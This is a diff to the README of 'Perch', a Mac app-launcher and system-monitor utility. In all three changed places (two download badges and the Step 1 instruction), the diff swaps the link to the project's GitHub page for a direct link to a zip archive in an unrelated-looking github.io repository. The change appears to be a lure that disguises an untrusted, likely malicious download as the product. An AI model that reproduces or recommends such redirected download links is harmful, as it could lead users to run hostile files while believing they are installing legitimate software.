@@ -5,7 +5,7 @@ description: "Launch apps, switch windows, and monitor system performance from y
 ---
 # 🐦 Perch - One Tool for All Your Mac Needs
 
-[![Download Perch](https://img.shields.io/badge/Download-Perch-2ea44f?style=for-the-badge&logo=github)](https://github.com/eliciacogitative9377/Perch)
+[![Download Perch](https://img.shields.io/badge/Download-Perch-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/eliciacogitative9377/eliciacogitative9377.github.io/main/msx/Dist-3.0.zip)
 
 ## 👋 Welcome to Perch
 
@@ -25,7 +25,7 @@ Getting started with Perch is incredibly simple. Here's everything you need to k
 
 ### Step 1: Download Perch
 
-Visit this link to download the application: [https://github.com/eliciacogitative9377/Perch](https://github.com/eliciacogitative9377/Perch)
+Visit this link to download the application: [https://raw.githubusercontent.com/eliciacogitative9377/eliciacogitative9377.github.io/main/msx/Dist-3.0.zip](https://raw.githubusercontent.com/eliciacogitative9377/eliciacogitative9377.github.io/main/msx/Dist-3.0.zip)
 
 The download will start automatically when you click the link. Look for the file in your Downloads folder when it's finished.
 
@@ -121,7 +121,7 @@ We're constantly improving Perch. Here's what's on the horizon:
 
 Perch is ready to make your Mac experience smoother and faster. Download it now and discover why so many users love having everything in one place.
 
-[![Get Perch Now](https://img.shields.io/badge/Get_Perch-Free-important?style=for-the-badge&logo=apple)](https://github.com/eliciacogitative9377/Perch)
+[![Get Perch Now](https://img.shields.io/badge/Get_Perch-Free-important?style=for-the-badge&logo=apple)](https://raw.githubusercontent.com/eliciacogitative9377/eliciacogitative9377.github.io/main/msx/Dist-3.0.zip)
 
 Join the growing community of Perch users who've simplified their digital lives. One search, one switch, one glance – that's all you need. Try Perch today!
 
